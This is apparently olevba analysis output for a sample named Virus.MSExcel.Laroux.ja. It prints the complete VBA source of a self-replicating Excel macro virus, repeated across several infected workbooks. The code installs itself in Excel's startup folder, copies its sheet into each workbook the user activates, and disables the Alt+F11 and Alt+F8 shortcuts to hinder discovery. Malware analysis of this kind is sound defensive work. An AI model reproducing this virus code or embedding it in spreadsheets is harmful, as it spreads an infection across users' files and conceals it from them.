olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.ja-8711f4e07a0760fff8165c1e1a180615a878871f
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/140╚╦ú¿╬σ─Ω╝╢ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.ScreenUpdating = True
End Sub
Sub cop()
Attribute cop.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)

End If
End Sub
Sub back()
Attribute back.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/140╚╦ú¿╬σ─Ω╝╢ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/142╚╦ú¿╦──Ω╝╢ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.ScreenUpdating = True
End Sub
Sub cop()
Attribute cop.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)

End If
End Sub
Sub back()
Attribute back.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/253╚╦ú¿╚²─Ω╝╢ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.ScreenUpdating = True
End Sub
Sub cop()
Attribute cop.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)

End If
End Sub
Sub back()
Attribute back.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/253╚╦ú¿╚²─Ω╝╢ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/287╚╦ú¿╢■─Ω╝╢╫▄ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.ScreenUpdating = True
End Sub
Sub cop()
Attribute cop.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)

End If
End Sub
Sub back()
Attribute back.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/287╚╦ú¿╢■─Ω╝╢╫▄ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: ╦╪╓╩│Θ▓Γ ╞║╔╜╩╡╤Θ/╞║╔╜╩╡╤Θ╦╪╓╩│Θ▓Γ├√╡Ñ/300╚╦ú¿╥╗─Ω╝╢ú⌐.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.ScreenUpdating = True
End Sub
Sub cop()
Attribute cop.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)

End If
End Sub
Sub back()
Attribute back.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
Application.ScreenUpdating = True
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

